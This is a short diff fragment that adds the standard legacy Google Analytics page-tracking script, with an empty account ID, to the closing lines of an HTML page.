+<script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', '']);
+    _gaq.push(['_trackPageview']);
+    (function() {
+        var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+        ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+        var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+</script>
+
+  </body>
+</html>
